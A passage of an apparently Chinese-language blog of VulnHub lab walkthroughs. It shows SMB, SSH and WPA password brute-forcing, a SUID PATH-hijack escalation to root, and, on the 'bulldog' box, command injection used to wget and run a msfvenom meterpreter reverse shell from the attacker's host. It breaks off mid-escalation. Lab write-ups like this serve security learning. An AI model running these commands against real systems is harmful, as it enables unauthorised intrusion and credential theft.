class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2020-02-14 11:13:57</span><br><span class="line">|_  start_date: N&#x2F;A</span><br></pre></td></tr></table></figure><h2 id="web路径枚举-5"><a class="markdownIt-Anchor" href="#web路径枚举-5"></a> Web路径枚举</h2><p><code>dirb http://192.168.31.185/ -w</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http:&#x2F;&#x2F;192.168.31.185&#x2F; ----</span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.185&#x2F;css&#x2F;                                          </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.185&#x2F;gallery&#x2F;                                      </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.185&#x2F;html&#x2F;                                         </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.185&#x2F;img&#x2F;                                          </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.185&#x2F;index.html (CODE:200|SIZE:3086)                            </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.185&#x2F;js&#x2F;                                           </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.185&#x2F;news&#x2F;                                         </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.185&#x2F;server-status (CODE:403|SIZE:279)</span><br></pre></td></tr></table></figure><p>在<code>index.html</code>页面的底端获取一段字符串<br /><code>####################GET#####smb##############free</code></p><p>在图片<code>/img/news.png</code>中获取信息<code>BlueKeep Attacks</code></p><blockquote><p>BlueKeep是Windows上RDP服务上的漏洞(CVE-2019-0708)，目测与本靶机关联并不大。</p></blockquote><h2 id="漏洞利用-5"><a class="markdownIt-Anchor" href="#漏洞利用-5"></a> 漏洞利用</h2><p><code>enum4linux 192.168.31.185</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">S-1-22-1-1000 Unix User\sagar (Local User)</span><br><span class="line">S-1-22-1-1001 Unix User\blackjax (Local User)</span><br><span class="line">S-1-22-1-1002 Unix User\smb (Local User)</span><br></pre></td></tr></table></figure><p>获得三个账户名</p><p>使用smbmap进行测试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">smbmap -H 192.168.31.185</span><br><span class="line">[+] Finding open SMB ports....</span><br><span class="line">[+] Guest SMB session established on 192.168.31.185...</span><br><span class="line">[+] IP: 192.168.31.185:445Name: 192.168.31.185                                    </span><br><span class="line">Disk                                                  Permissions</span><br><span class="line">----                                                  -----------</span><br><span class="line">print$                                            NO ACCESS</span><br><span class="line">IPC$                                              NO ACCESS</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">smbmap -H 192.168.31.185 -u smb</span><br><span class="line">[+] Finding open SMB ports....</span><br><span class="line">[+] User SMB session establishd on 192.168.31.185...</span><br><span class="line">[+] IP: 192.168.31.185:445Name: 192.168.31.185                                    </span><br><span class="line">Disk                                                  Permissions</span><br><span class="line">----                                                  -----------</span><br><span class="line">print$                                            READ ONLY</span><br><span class="line">IPC$                                              NO ACCESS</span><br></pre></td></tr></table></figure><p>账户smb可以登入SMB服务</p><p>使用hydra爆破SMB服务中SMB账户的密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hydra -I -l smb -P &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt -e n smb:&#x2F;&#x2F;192.168.31.185</span><br><span class="line"></span><br><span class="line">[DATA] attacking smb:&#x2F;&#x2F;192.168.31.185:445&#x2F;</span><br><span class="line">[445][smb] host: 192.168.31.185   login: smb</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br></pre></td></tr></table></figure><p>密码为空</p><p>登入SMB服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">smbclient &#x2F;&#x2F;192.168.31.185&#x2F;smb -U smb</span><br><span class="line"></span><br><span class="line">ls</span><br><span class="line">    .                                   D        0  Mon Nov  4 06:50:37 2019</span><br><span class="line">    ..                                  D        0  Mon Nov  4 06:37:28 2019</span><br><span class="line">    main.txt                            N       10  Mon Nov  4 06:45:38 2019</span><br><span class="line">    safe.zip                            N  3424907  Mon Nov  4 06:50:37 2019</span><br><span class="line">    </span><br><span class="line">                9204224 blocks of size 1024. 6824568 blocks available</span><br></pre></td></tr></table></figure><p>下载文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">get main.txt</span><br><span class="line">get safe.zip</span><br></pre></td></tr></table></figure><p><code>main.txt</code>中没有有效信息<br /><code>safe.zip</code>被加密<br />使用<code>fcrackzip</code>进行爆破</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fcrackzip -u -D -p &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt safe.zip</span><br><span class="line"></span><br><span class="line">    PASSWORD FOUND!!!!: pw &#x3D;&#x3D; hacker1</span><br></pre></td></tr></table></figure><p>解压压缩包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unzip safe.zip</span><br><span class="line">hacker1</span><br></pre></td></tr></table></figure><p>得到两个文件</p><ul><li><code>secret.jpg</code> 有文字–“AFTER THE WALKOUT”，暂时不考虑图片隐写等其他因素</li><li><code>user.cap</code> WireShare打开之后是IEEE 802.11协议(WIFI)的流量包，可能存在握手包</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">aircrack-ng -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt user.cap</span><br><span class="line"></span><br><span class="line">Opening user.cap please wait...</span><br><span class="line">Read 49683 packets.</span><br><span class="line"></span><br><span class="line">   #  BSSID              ESSID                     Encryption</span><br><span class="line"></span><br><span class="line">   1  56:DC:1D:19:52:BC  blackjax                  WPA (1 handshake)</span><br><span class="line"></span><br><span class="line">Choosing first network as target.</span><br><span class="line"></span><br><span class="line">Opening user.cap please wait...</span><br><span class="line">Read 49683 packets.</span><br><span class="line"></span><br><span class="line">1 potential targets</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                              Aircrack-ng 1.5.2 </span><br><span class="line"></span><br><span class="line">      [00:00:07] 21280&#x2F;7120712 keys tested (2885.36 k&#x2F;s) </span><br><span class="line"></span><br><span class="line">      Time left: 41 minutes, 0 seconds                           0.30%</span><br><span class="line"></span><br><span class="line">                           KEY FOUND! [ snowflake ]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      Master Key     : 80 0A BE 28 5A 50 78 10 7E E2 85 A8 E8 D0 41 3C </span><br><span class="line">                       5E CB 18 C2 40 05 D7 7F E1 12 E6 B4 C6 D8 F4 E5 </span><br><span class="line"></span><br><span class="line">      Transient Key  : C8 9D B1 E2 76 82 F3 90 AC 53 CB 02 8F D0 73 FB </span><br><span class="line">                       47 92 63 63 56 97 1C 19 36 BD FD B4 D5 6D 65 35 </span><br><span class="line">                       48 1B D3 06 57 40 4D 77 9D BD 26 30 1B B3 06 AF </span><br><span class="line">                       1B FA 37 7E E8 9C 17 07 BE 63 DD C0 11 D4 88 21 </span><br><span class="line"></span><br><span class="line">      EAPOL HMAC     : 68 98 0E 18 F9 DA 55 3B 4B BC EA 35 37 CC 25 2F</span><br></pre></td></tr></table></figure><p>SSID为<code>blackjax</code>，密码为<code>snowflake</code></p><p>在WireShark中调试<br />Preference -&gt; Protocols -&gt; IEEE 802.11-&gt; Decryption keys -&gt; Edit<br />添加Key记录<br /><code>wpa-pwd|snowflake:blackjax</code><br />流量包中未找到其他有效信息</p><p>尝试枚举SSH账户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo -e &quot;smb\nblackjax\nsagar\nroot\nadmin\nhelo\nsnowflake&quot; &gt; test</span><br><span class="line">hydra -I -L test -P test -e ns -u ssh:&#x2F;&#x2F;192.168.31.185 -s 2525</span><br><span class="line">    [2525][ssh] host: 192.168.31.185   login: blackjax   password: snowflake</span><br></pre></td></tr></table></figure><p>获取账户blackjax</p><h2 id="权限提升-5"><a class="markdownIt-Anchor" href="#权限提升-5"></a> 权限提升</h2><p>登入SSH服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh blackjax@192.168.31.185 -p 2525</span><br><span class="line">snowflake</span><br><span class="line">&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure><p>尝试SUID提权</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line"></span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;dbus-1.0&#x2F;dbus-daemon-launch-helper</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;openssh&#x2F;ssh-keysign</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;policykit-1&#x2F;polkit-agent-helper-1</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;snapd&#x2F;snap-confine</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;i386-linux-gnu&#x2F;lxc&#x2F;lxc-user-nic</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;eject&#x2F;dmcrypt-get-device</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;newgidmap</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;gpasswd</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;newuidmap</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;chfn</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;passwd</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;chsh</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;pkexec</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;newgrp</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;netscan</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;sudo</span><br><span class="line">&#x2F;bin&#x2F;ping6</span><br><span class="line">&#x2F;bin&#x2F;fusermount</span><br><span class="line">&#x2F;bin&#x2F;mount</span><br><span class="line">&#x2F;bin&#x2F;su</span><br><span class="line">&#x2F;bin&#x2F;ping</span><br><span class="line">&#x2F;bin&#x2F;umount</span><br><span class="line">&#x2F;bin&#x2F;ntfs-3g</span><br></pre></td></tr></table></figure><p><code>/usr/bin/netscan</code>有些异常</p><p>使用<code>strings</code>命令分析</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">strings &#x2F;usr&#x2F;bin&#x2F;netscan </span><br><span class="line"></span><br><span class="line">&#x2F;lib&#x2F;ld-linux.so.2</span><br><span class="line">libc.so.6</span><br><span class="line">_IO_stdin_used</span><br><span class="line">setuid</span><br><span class="line">system</span><br><span class="line">setgid</span><br><span class="line">__libc_start_main</span><br><span class="line">__gmon_start__</span><br><span class="line">GLIBC_2.0</span><br><span class="line">PTRh</span><br><span class="line">QVhk</span><br><span class="line">UWVS</span><br><span class="line">t$,U</span><br><span class="line">[^_]</span><br><span class="line">netstat -antp</span><br><span class="line">;*2$&quot;(</span><br><span class="line">GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.11) 5.4.0 20160609</span><br><span class="line">crtstuff.c</span><br><span class="line">__JCR_LIST__</span><br><span class="line">deregister_tm_clones</span><br><span class="line">__do_global_dtors_aux</span><br><span class="line">completed.7209</span><br><span class="line">__do_global_dtors_aux_fini_array_entry</span><br><span class="line">frame_dummy</span><br><span class="line">__frame_dummy_init_array_entry</span><br><span class="line">pingshell.c</span><br><span class="line">__FRAME_END__</span><br><span class="line">__JCR_END__</span><br><span class="line">__init_array_end</span><br><span class="line">_DYNAMIC</span><br><span class="line">__init_array_start</span><br><span class="line">__GNU_EH_FRAME_HDR</span><br><span class="line">_GLOBAL_OFFSET_TABLE_</span><br><span class="line">__libc_csu_fini</span><br><span class="line">_ITM_deregisterTMCloneTable</span><br><span class="line">__x86.get_pc_thunk.bx</span><br><span class="line">_edata</span><br><span class="line">__data_start</span><br><span class="line">setgid@@GLIBC_2.0</span><br><span class="line">system@@GLIBC_2.0</span><br><span class="line">__gmon_start__</span><br><span class="line">__dso_handle</span><br><span class="line">_IO_stdin_used</span><br><span class="line">__libc_start_main@@GLIBC_2.0</span><br><span class="line">__libc_csu_init</span><br><span class="line">_fp_hw</span><br><span class="line">__bss_start</span><br><span class="line">main</span><br><span class="line">setuid@@GLIBC_2.0</span><br><span class="line">_Jv_RegisterClasses</span><br><span class="line">__TMC_END__</span><br><span class="line">_ITM_registerTMCloneTable</span><br><span class="line">.symtab</span><br><span class="line">.strtab</span><br><span class="line">.shstrtab</span><br><span class="line">.interp</span><br><span class="line">.note.ABI-tag</span><br><span class="line">.note.gnu.build-id</span><br><span class="line">.gnu.hash</span><br><span class="line">.dynsym</span><br><span class="line">.dynstr</span><br><span class="line">.gnu.version</span><br><span class="line">.gnu.version_r</span><br><span class="line">.rel.dyn</span><br><span class="line">.rel.plt</span><br><span class="line">.init</span><br><span class="line">.plt.got</span><br><span class="line">.text</span><br><span class="line">.fini</span><br><span class="line">.rodata</span><br><span class="line">.eh_frame_hdr</span><br><span class="line">.eh_frame</span><br><span class="line">.init_array</span><br><span class="line">.fini_array</span><br><span class="line">.jcr</span><br><span class="line">.dynamic</span><br><span class="line">.got.plt</span><br><span class="line">.data</span><br><span class="line">.bss</span><br><span class="line">.comment</span><br></pre></td></tr></table></figure><p>可以看到<code>netstat -antp</code><br />猜想这个二进制文件是在执行netstat命令<br />则可以进行PATH提权</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;tmp</span><br><span class="line">echo &quot;&#x2F;bin&#x2F;bash&quot; &gt;netstat</span><br><span class="line">chmod 777 netstat</span><br><span class="line">echo $PATH</span><br><span class="line">export PATH&#x3D;&#x2F;tmp:$PATH</span><br><span class="line">cd &#x2F;usr&#x2F;bin</span><br><span class="line">.&#x2F;netscan</span><br><span class="line">id</span><br><span class="line">    uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root),1001(blackjax)</span><br></pre></td></tr></table></figure><hr /><blockquote><p>PATH提权</p></blockquote><ul><li>目标文件为二进制可执行文件</li><li>需要知道目标文件所执行的命令</li><li>strings查看可执行文件内容</li></ul><p>参考资料</p><blockquote><p><a href="https://www.moonsec.com/archives/709">WP</a><br /><a href="https://www.freebuf.com/articles/system/221949.html">WP</a><br /><a href="https://www.xuebuyuan.com/3235974.html">SMB</a><br /><a href="https://www.anquanke.com/post/id/146799">PATH提权</a></p></blockquote><hr /><h1 id="bulldog"><a class="markdownIt-Anchor" href="#bulldog"></a> <a href="https://www.vulnhub.com/entry/bulldog-1,211/">bulldog</a></h1><p><code>2020/02/17 19:06:44</code></p><h2 id="端口扫描-6"><a class="markdownIt-Anchor" href="#端口扫描-6"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -sV -T5 -n -v -A 192.168.31.121</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.31.121</span><br><span class="line">Host is up (0.0011s latency).</span><br><span class="line">Not shown: 65532 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">23&#x2F;tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 20:8b:fc:9e:d9:2e:28:22:6b:2e:0e:e3:72:c5:bb:52 (RSA)</span><br><span class="line">|   256 cd:bd:45:d8:5c:e4:8c:b6:91:e5:39:a9:66:cb:d7:98 (ECDSA)</span><br><span class="line">|_  256 2f:ba:d5:e5:9f:a2:43:e5:3b:24:2c:10:c2:0a:da:66 (ED25519)</span><br><span class="line">80&#x2F;tcp   open  http    WSGIServer 0.1 (Python 2.7.12)</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD OPTIONS</span><br><span class="line">|_http-server-header: WSGIServer&#x2F;0.1 Python&#x2F;2.7.12</span><br><span class="line">|_http-title: Bulldog Industries</span><br><span class="line">8080&#x2F;tcp open  http    WSGIServer 0.1 (Python 2.7.12)</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD OPTIONS</span><br><span class="line">|_http-server-header: WSGIServer&#x2F;0.1 Python&#x2F;2.7.12</span><br><span class="line">|_http-title: Bulldog Industries</span><br><span class="line">MAC Address: 08:00:27:33:65:D8 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:&#x2F;o:linux:linux_kernel:3 cpe:&#x2F;o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Uptime guess: 0.003 days (since Sun Feb 16 21:45:10 2020)</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">TCP Sequence Prediction: Difficulty&#x3D;257 (Good luck!)</span><br><span class="line">IP ID Sequence Generation: All zeros</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br></pre></td></tr></table></figure><h2 id="web路径枚举-6"><a class="markdownIt-Anchor" href="#web路径枚举-6"></a> Web路径枚举</h2><p>尝试爆破80端口下的Web路径</p><p><code>dirb http://192.168.31.121/</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http:&#x2F;&#x2F;192.168.31.121&#x2F; ----</span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.121&#x2F;admin&#x2F;                                                  </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.121&#x2F;dev&#x2F;                                                    </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.121&#x2F;robots.txt (CODE:200|SIZE:1071)</span><br><span class="line"></span><br><span class="line">---- Entering directory: http:&#x2F;&#x2F;192.168.31.121&#x2F;dev&#x2F;shell&#x2F; ----</span><br></pre></td></tr></table></figure><p>尝试爆破8080端口下的Web路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">dirb http:&#x2F;&#x2F;192.168.31.121:8080&#x2F;</span><br><span class="line"></span><br><span class="line">---- Scanning URL: http:&#x2F;&#x2F;192.168.31.121:8080&#x2F; ----</span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.121:8080&#x2F;admin&#x2F;</span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.121:8080&#x2F;dev&#x2F;</span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.121:8080&#x2F;robots.txt (CODE:200|SIZE:1071)</span><br><span class="line">                                                    </span><br><span class="line">---- Entering directory: http:&#x2F;&#x2F;192.168.31.121:8080&#x2F;dev&#x2F;shell&#x2F; ----</span><br></pre></td></tr></table></figure><p>80端口与8080端口上的WEB服务的路径几乎一样，极可能是同一个站点。<br />访问两个WEB服务之后发现并无差别，先对80端口进行渗透。</p><h2 id="漏洞利用-6"><a class="markdownIt-Anchor" href="#漏洞利用-6"></a> 漏洞利用</h2><p>访问路径<code>/admin/</code>跳转至登录界面<br />简单尝试弱口令后无效</p><p>访问路径<code>/dev/shell/</code>时提示 <strong>&quot;Please authenticate with the server to use Web-Shell&quot;</strong><br />猜测需要在之前的登录界面中登入后才能访问</p><p>访问路径<code>/dev/</code>与<code>/</code>时发现一些人名<br />制作简易字典</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">cat dic</span><br><span class="line"></span><br><span class="line">Winston Churchy</span><br><span class="line">Bulldog Industries</span><br><span class="line">Alan Brooke</span><br><span class="line">alan@bulldogindustries.com</span><br><span class="line">william@bulldogindustries.com</span><br><span class="line">malik@bulldogindustries.com</span><br><span class="line">kevin@bulldogindustries.com</span><br><span class="line">ashley@bulldogindustries.com</span><br><span class="line">nick@bulldogindustries.com</span><br><span class="line">sarah@bulldogindustries.com</span><br><span class="line">admin@bulldogindustries.com</span><br><span class="line">admin</span><br><span class="line">root</span><br><span class="line">Sarah</span><br><span class="line">sarah</span><br><span class="line">Nick</span><br><span class="line">nick</span><br><span class="line">Ashley</span><br><span class="line">ashley</span><br><span class="line">Kevin</span><br><span class="line">kevin</span><br><span class="line">Malik</span><br><span class="line">malik</span><br><span class="line">William</span><br><span class="line">william</span><br><span class="line">Alan</span><br><span class="line">alan</span><br><span class="line">Brooke</span><br><span class="line">brooke</span><br><span class="line">Bulldog</span><br><span class="line">bulldog</span><br><span class="line">Industries</span><br><span class="line">industries</span><br><span class="line">Winston</span><br><span class="line">winston</span><br><span class="line">Churchy</span><br><span class="line">churchy</span><br></pre></td></tr></table></figure><p>使用burpsuite进行账户爆破<br />得到账户<code>nick:bulldog</code></p><p>登入之后得到提示<code>You don't have permission to edit anything.</code></p><p>此时再访问<code>/dev/shell/</code><br />WEB端执行系统命令 -&gt; 命令注入<br />简单尝试之后发现<code>ls|cat /etc/passwd</code>可以执行</p><p>但是这个WEB是基于python的Django架构，不存在写入一句话木马的方法。<br />大概有两种方法：</p><ul><li>nc连接(正向连接/反弹Shell)</li><li>wget下载后门程序</li></ul><p><strong>第一种方法</strong><br />直接返回500<br />pass</p><p><strong>第二种方法</strong><br />生成后门文件&amp;启动HTTP服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p python&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.31.10 LPORT&#x3D;2020 &gt; shell.py</span><br><span class="line">python -m SimpleHTTPServer 80 &amp;</span><br></pre></td></tr></table></figure><p>MSF</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload python&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set LHOST 192.168.31.10</span><br><span class="line">set LPORT 2020</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>命令注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls|wget http:&#x2F;&#x2F;192.168.31.10&#x2F;shell.py</span><br><span class="line">ls|python shell.py</span><br></pre></td></tr></table></figure><p>在MSF中接收到Shell</p><h2 id="权限提升-6"><a class="markdownIt-Anchor" href="#权限提升-6"></a> 权限提升</h2><p>获取tty</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span 